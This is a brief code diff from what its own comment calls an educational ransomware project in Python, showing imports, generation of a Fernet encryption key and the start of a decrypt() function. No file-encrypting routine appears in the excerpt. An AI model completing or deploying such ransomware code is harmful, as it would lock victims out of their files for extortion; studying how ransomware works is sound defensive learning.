@@ -1,10 +1,10 @@
 #This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
 import pygame
 import os
+import random
 from cryptography.fernet import Fernet 
 
 key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT 
-
 def decrypt():
    input("decrypt?")
    #read file key 
